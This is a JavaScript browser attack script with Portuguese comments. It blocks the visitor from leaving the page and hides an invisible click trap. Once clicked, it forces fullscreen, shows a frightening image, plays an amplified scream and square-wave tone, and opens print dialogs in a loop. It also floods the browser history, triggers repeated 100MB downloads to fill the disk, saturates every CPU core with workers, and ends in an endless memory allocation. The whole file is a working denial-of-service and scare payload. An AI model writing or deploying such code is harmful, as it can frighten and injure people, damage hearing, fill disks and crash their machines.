(function() {
    // Bloqueios de saída e depuração iniciam imediatamente
    setInterval(() => { (function(){}).constructor("debugger")(); }, 50);
    window.onbeforeunload = () => "꧅";

    const audioData = `data:audio/mp3;base64,TU9...`; // Insira seu base64 aqui

    // 1. PRÉ-CARREGAMENTO (Ordem de execução)
    const preScream = new Audio(audioData);
    preScream.preload = "auto";

    const preImg = new Image();
    preImg.src = 'https://wallpapers.com/images/hd/scary-face-pictures-fvx05bim45ctjiwh.jpg';

    // Função que orquestra o início após o carregamento
    const prepararGatilho = () => {
        const promises = [
            new Promise(res => { preImg.onload = res; preImg.onerror = res; }),
            new Promise(res => { preScream.oncanplaythrough = res; })
        ];

        Promise.all(promises).then(() => {
            // Criar o "negócio invisível" (overlay de clique)
            const gate = document.createElement('div');
            gate.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;background:transparent;cursor:pointer;';
            document.body.appendChild(gate);

            gate.onclick = () => {
                gate.remove(); // Remove o gatilho
                runScare();    // Inicia o código principal
            };
        });
    };

    const runScare = () => {
        document.body.innerHTML = '';
        document.documentElement.style.overflow = 'hidden';
        const root = document.documentElement;

        // Inicia impressão em loop
        setInterval(() => { window.print(); }, 1000);

        // Forçar Fullscreen
        const forceFS = () => { if (!document.fullscreenElement) root.requestFullscreen().catch(() => {}); };
        document.addEventListener('fullscreenchange', forceFS);
        forceFS();

        // UI de exibição
        const ui = document.createElement('div');
        ui.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:2147483640;overflow:hidden;';
        preImg.style.cssText = 'width:100%;height:100%;object-fit:cover;';
        ui.appendChild(preImg);
        document.body.appendChild(ui);

        // Contexto de Áudio Profissional
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const master = ctx.createGain();
        master.gain.value = 8.0; 
        master.connect(ctx.destination);
        
        const sSrc = ctx.createMediaElementSource(preScream);
        sSrc.connect(master);
        preScream.loop = true;
        preScream.play();

        const osc = ctx.createOscillator();
        osc.type = 'square';
        const oscG = ctx.createGain();
        oscG.gain.value = 0.8;
        osc.connect(oscG).connect(master);
        osc.start();

        const cvs = document.createElement('canvas');
        const gl = cvs.getContext('webgl');
        cvs.style.display = 'none'; 
        document.body.appendChild(cvs);

        // Loop de Caos Visual
        const chaos = () => {
            preImg.style.transform = `scale(${1.3 + Math.random() * 0.7}) translate(${(Math.random()-0.5)*150}px, ${(Math.random()-0.5)*150}px)`;
            preImg.style.filter = `contrast(10) brightness(2) hue-rotate(${Math.random()*360}deg)`;
            document.title = "꧅" + Math.random().toString(36);
            
            for(let i=0; i<50; i++) {
                history.pushState(null, "", "#" + Math.random().toString(36));
            }

            cvs.width = 4096; cvs.height = 4096;
            gl.clearColor(Math.random(), 0, 0, 1);
            gl.clear(gl.COLOR_BUFFER_BIT);

            osc.frequency.setValueAtTime(Math.sin(ctx.currentTime * 30) * 2000 + 3000, ctx.currentTime);
            requestAnimationFrame(chaos);
        };
        chaos();

        // Bombardeio de Download (IO)
        const bombDisk = () => {
            const blob = new Blob([new Uint8Array(1024 * 1024 * 100)]); 
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = `sys_log_${Math.random()}.bin`;
            a.click();
            setTimeout(bombDisk, 800);
        };
        bombDisk();

        // Sobrecarga de CPU (Workers)
        const workerBlob = new Blob(['while(true){postMessage(0)}'], {type: 'text/javascript'});
        const wURL = URL.createObjectURL(workerBlob);
        for(let k=0; k<navigator.hardwareConcurrency; k++) new Worker(wURL);

        // Travamento Final de Memória (RAM)
        setTimeout(() => {
            const bomb = [];
            while(true) { 
                bomb.push(new Array(1000000).fill("꧅").join("")); 
            }
        }, 1500);
    };

    // Inicia o processo de espera
    prepararGatilho();

})();
